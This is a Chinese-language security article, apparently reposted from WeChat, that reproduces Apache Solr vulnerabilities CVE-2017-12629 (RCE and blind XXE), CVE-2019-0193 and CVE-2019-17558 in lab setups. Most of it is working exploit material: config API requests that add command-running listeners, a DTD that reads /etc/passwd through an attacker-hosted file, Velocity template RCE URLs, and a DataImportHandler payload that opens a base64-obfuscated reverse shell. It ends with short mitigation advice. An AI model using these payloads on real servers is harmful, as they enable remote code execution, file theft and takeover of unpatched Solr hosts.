> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/mg1Q4Lnu01AC6IWCpElSnw)

**Apache Solr 简介**

```
Apache Solr 中存储的资源是以 Document 为对象进行存储的。每个文档由一系列的 Field 构成，每个 Field 表示资源的一个属性。Solr 中的每个 Document 需要有能唯一标识其自身的属性，默认情况下这个属性的名字是 id，在 Schema 配置文件中使用：<uniqueKey>id</uniqueKey>进行描述。
Solr是一个高性能，采用Java5开发，基于Lucene的全文搜索服务器。Solr是一个独立的企业级搜索应用服务器，很多企业运用solr开源服务。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。它的主要特性包括：高效、灵活的缓存功能，垂直搜索功能，高亮显示搜索结果，通过索引复制来提高可用性，提 供一套强大Data Schema来定义字段，类型和设置文本分析，提供基于Web的管理界面等。
```

**漏洞汇总**  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YfjsF8HQKeMR8Nr3YKZiat6TbHQ58pSOnaibz3N6ICEbuCQaT3g30sdfw/640?wx_fmt=png)

**CVE-2017-12629 远程命令执行漏洞**  

**漏洞简述**

    Apache Solr 是 Apache 开发的一个开源的基于 Lucene 的全文搜索服务器。其集合的配置方法（config 路径）可以增加和修改监听器，通过 RunExecutableListener 执行任意系统命令。

**漏洞影响版本**

    Apache Solr 是 Apache 开发的一个开源的基于 Lucene 的全文搜索服务器。其集合的配置方法（config 路径）可以增加和修改监听器，通过 RunExecutableListener 执行任意系统命令。

```
Apache Solr < 7.1
Apache Lucene < 7.1
包括
RedhatSingle Sign-On 7.0
+ Redhat Linux 6.2 E sparc
+ Redhat Linux 6.2 E i386
+ Redhat Linux 6.2 E alpha
+ Redhat Linux 6.2 sparc
+ Redhat Linux 6.2 i386
+ Redhat Linux 6.2 alpha
Redhat JBoss Portal Platform 6
Redhat JBoss EAP 7 0
Redhat Jboss EAP 6
Redhat JBoss Data Grid 7.0.0
Redhat Enterprise Linux 6
+ Trustix Secure Enterprise Linux 2.0
+ Trustix Secure Linux 2.2
+ Trustix Secure Linux 2.1
+ Trustix Secure Linux 2.0
Redhat Collections for Red Hat EnterpriseLinux 0
Apache Solr 6.6.1
Apache Solr 6.6
Apache Solr 6.5.1
Apache Solr 6.5
Apache Solr 6.4
Apache Solr 6.3
Apache Solr 6.2
Apache Solr 6.6
Apache Solr 6.3
Apache Solr 6.0
ApacheLucene 0
```

**环境搭建**  

    使用 docker 搭建的 vulhub 靶场  

**漏洞分析**  

    RunExecutableListener 类中使用了 Runtime.getRuntime().exec() 方法，可用于在某些特定事件中执行任意命令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YDe1uB3GvaOic2FicsgeZ8694DuGwCRkB4aTSTBe5AUto0td20CUOtGeg/640?wx_fmt=png)

使用了 config API 传入 add-listener 命令即可调用 RunExecutableListener

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YPiby4yRCScqIQylVQex7JoXl2zOzAICFAOYNAF7CEucQVhqib0eZJ1dw/640?wx_fmt=png)

**漏洞攻击主要特征**

1) 端口：8983， http  
2) 路径是：/config HTTP/1.1  
3) 载荷中必要特征是：  
Content：update-listener 或 create-listener  
Content："event": "postCommit"(备选)  
Content: "class":"solr.RunExecutableListener"

**漏洞复现**

 1. 启动漏洞环境后访问 ip:8983

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YLIib8R9ibxx6F9bRDwk04EJS0pBRKSjRqHUBibr7d0SR37TOiblVbBaOMw/640?wx_fmt=png)

 2. 首先创建一个 listener，其中设置 exe 的值为我们想执行的命令，args 的值是命令参数  

```
POST /solr/demo/config HTTP/1.1
Host: ip:8983
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 169

{"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","    args":["-c", "touch /tmp/cve-2017-12629"]}}
```

    这里的 “exe”，“dir”，“args” 内容也都可以通过 http 的方式传入，所以在没有访问控制的情况下任何人都可以通过该 config API 达到任意命令执行的操作

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0Y4IlH08txIMzWibqEvTxkPUib3vWBIKc4ehOdafy63wZ55cbqYbWzhpjg/640?wx_fmt=png)

    3. 然后进行 update 操作，触发刚刚添加的 listener

```
POST /solr/demo/update HTTP/1.1
Host: ip:8983
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 17

[{"id":"test"}]
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0Yfkkjhf2mLd0F3LNFcJEz1xnfGibWRYsg5FaqS5WKAbQWsKctfEaM7IA/640?wx_fmt=png)

    4. 进入容器可以发现 /tmp/ ，目录下已经成功创建了一个文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YZuv71J5tia03jha7nZtaWeA6qYiayk5tPkzr0VPXWRsadJe8CJ7kg02A/640?wx_fmt=png)

**如何进行防护**  

1. 添加 Solr 访问控制，包括禁止本地直接未授权访问  
2. 针对 RCE 问题，由于涉及的是 SolrCloud 所以建议在所有节点中添加 filter，进行相关过滤

**CVE-2017-12629 XXE 漏洞**

**漏洞简述**

Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理基本上是文档通过 Http 利用 XML 加到一个搜索集合中

**漏洞影响版本**

Apache Solr < 7.1  
Apache Lucene < 7.1

**漏洞分析**

这是一个典型的 XXE 漏洞的缺陷编码示例，Lucene 包含了一个查询解析器支持 XML 格式进行数据查询，出现问题的代码片段在 /solr/src/lucene/queryparser/src/java/org/apache/lucene/queryparser/xml/CoreParser.java 文件中

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YjD3FEl6zC6AhL5PKVAoWIgZyrGQic6v70ZT2ibOkpFocLIwlNZKArtwg/640?wx_fmt=png)

通过查看调用栈中的数据处理流程，在调用 lucene xml 解析器时确实没有对 DTD 和外部实体进行替换处理，造成了盲目 XXE  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YiavVlxc68FpQxybCKXovcZ50E8YbleFicuvqkxnljicNEOLEJXIXO0icGQ/640?wx_fmt=png)

**漏洞复现**  

1. 先构造一个站点，放置 dtd 文件 (里面写要执行的代码)，然后用 solr 去包含这个 dtd 站点，就会自动读取 dtd 文件中的文件路径

构造 dtd 站点，这里使用 phpstudy 搭建  
创建一个 1.dtd 文件，dtd 文件内容如下

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YTbmGzMo29IjIDocCAOAicDCOEouO2o8icjibfeD5G4Via0IdLzBc0jZq2w/640?wx_fmt=png)

**由于返回包中不包含我们传入的 XML 中的信息，所以这是一个 Blind XXE 漏洞。**

访问 solr 服务，触发我们的 dtd 文件，浏览器输入如下 payload，里面的 IP 和文件名称根据实际情况修改，这里 solr 的 ip 为 192.168.239.170，文件名称是 1.dtd （payload 需要进行 url 编码）

```
http://192.168.239.129:8983/solr/demo/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2f192.168.239.170%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0Yy9tZ0I7KY1edYzg8g3ibQI0ClBib12nW4KgqW1Z4KrJz6DmWpRqT1ibJQ/640?wx_fmt=png)

```
GET /solr/demo/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root[%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2f192.168.50.167%2f1.dtd%22%3E%25ext%3b%25ent%3b]%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser HTTP/1.1
Host: 192.168.50.248:8983
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YRvNbp1YlaM980ibQh2f9d3FVDP5B58MgAOZwgnxWhzZ5WxJ7tcHPneQ/640?wx_fmt=png)

**CVE-2019-0193 远程命令执行漏洞**

****漏洞简述****

漏洞出现在 Apache Solr 的 DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的 DIH 配置都可以通过外部请求的 dataConfig 参数来设置。由于 DIH 配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。

****影响版本****

Apache Solr < 8.2.0  
Apache Solr 5.x - 8.2.0，存在 config API 版本

**漏洞原理**

该漏洞的产生是由于两方面的原因：  
当攻击者可以直接访问 Solr 控制台时，可以通过发送类似 / 节点名 / config 的 POST 请求对该节点的配置文件做更改。  
Apache Solr 默认集成 VelocityResponseWriter 插件，在该插件的初始化参数中的 params.resource.loader.enabled 这个选项是用来控制是否允许参数资源加载器在 Solr 请求参数中指定模版，默认设置是 false。  
当设置 params.resource.loader.enabled 为 true 时，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。

******漏洞复现******

使用 docker 搭建的 vulhub 靶场  
1. 创建名为 test 的 Core

```
docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db
```

2. 搭建好后访问页面。默认端口为 8983

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0Y8RjYFeMdR1ZSVia3d63CvGIu9B4j0nO09seYjyyh9wlibpXjRrMwZWJA/640?wx_fmt=png)

3. 选择刚创建的 text 核心，直接构造 POST 请求，在 / solr/test/config 目录下 POST 请求发送以下数据 (修改 Core 的配置)

```
{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YPVz9FuptoqxZh6f4BljQ4vWYKia0xuuuibibibYcOWdGos30AkTzdylDiaA/640?wx_fmt=png)

3. 使用 EXP 进行攻击

```
http://ip:8983/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YXPDGEWeCpIcBjXulfxBIWm7oO2qDkBYDE6pkHN5usVX9TArLw26IaQ/640?wx_fmt=png)

4. 成功执行系统命令  

******另一种执行命令的方法******

1. 选择刚创建好的 test 核心，选择 Dataimport 功能并选择 debug 模块，将以下 POC 填入 (原来的删除)

```
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/success");
          }
  ]]></script>
  <document>
    <entity 
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YT4A8Cr9LI4ia9l3zrSdbhPJCAb5Wczf5so8SQf8qCeN9uNxmQrXNJXQ/640?wx_fmt=png)

2. 点击 Execute with this Confuguration 执行 POC，发送数据包

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YjM7xEEfVg2q5xP0tAZ6iciaRZXx6gh2U3L7LLLzhtTdwqgFpmMNDfu3Q/640?wx_fmt=png)

3. 执行 POC 成功后，进入 docker 容器，可以难倒 /tmp/success 已成功创建

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0Y6FoZSU26BJJWlDWc9NWWerhCKiczxIFESmD6heNYk5osajmrDToqbyw/640?wx_fmt=png)

4. 反弹 shell  
修改 POC 后，点击提交按钮发送

```
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUwLjE2Ny8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}");
          }
  ]]></script>
  <document>
    <entity 
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig>
```

成功反弹 shell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YOhZqWSRqYp8FgV2TolGGUnQIgHvQQAYP74ickPFUrv4cxsJ100b4nGw/640?wx_fmt=png)

**CVE-2019-17558 远程命令执行漏洞**

**漏洞概述**

Solr 是 Apache Lucene 项目的开源企业搜索平台。其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本的处理  
Apache Solr 5.0.0 版本至 8.3.1 版本中存在输入验证错误漏洞。攻击者可借助 Velocity 模板利用该漏洞在系统上执行任意代码。

****漏洞影响版本****

Apache Solr 5.0.0 ~8.3.1

**漏洞复现**

1. 访问漏洞环境 ip:8983

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0Y7kibofibKb0lGjTziamUnniaB1v7H4d0b7RibDdQ6dCI8nljfnNme9iaFblw/640?wx_fmt=png)

2. 默认情况下 params.resource.loader.enabled 配置未打开，无法使用自定义模板。我们先通过如下 API 获取所有的核心。可以先通过如下 API 获取所有的核心 (在 vulhub 中核心就是 demo)  

```
http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YmURT2dPrI2FPcqdecGAQ4auglXW7QiambjDOhD6WUBic5lgHVmibx1uww/640?wx_fmt=png)

3. 启用配置 params.resource.loader.enabled ，在 url 访问 / solr/demo/config 使用 Burp 抓包改成 POST 然后修改启动配置 (然后把 Content-Type 修改成 application/json）

**后边路径如下：/solr / 获取的内核名称 / config**

```
{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true", 
    "params.resource.loader.enabled": "true"
  }
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YpUtvAibF36oiaC004iaicJOc4VQjUQvd61GesNvliaibksNMmp6RYESQcDaw/640?wx_fmt=png)

4. 通过 Velocity 模板执行命令，如 whoami。修改 exec(%27whoami%27) 中的代码即可更改命令。使用如下命令

```
http://ip:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0Yal5mWw1SMghHlPjy2b0FWyVbn9Kbqrj8Nria45lvqJjUtDM0uQ3Msxg/640?wx_fmt=png)

5. 成功执行系统命令

**漏洞利用工具**

下载地址: （https://github.com/jas502n/solr_rce） python2 的环境

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YW2cpOW5fVnoibho1eH8FvEe9Bsqc5UWLbibGqcka5E4Wia4k9u2iahHymA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBbVs0l4IFsptHOgpXLfr0YZCmaJ9nTrvkBlnbvAYXiboq0VcbzR8zkr72GInvIpJNg2R66eyCuviag/640?wx_fmt=png)

****修复建议****

1、更新到 Apache Solr 8.4 或更高版本；  
2、配置安全组，仅允许可信网络流量访问 Solr 服务。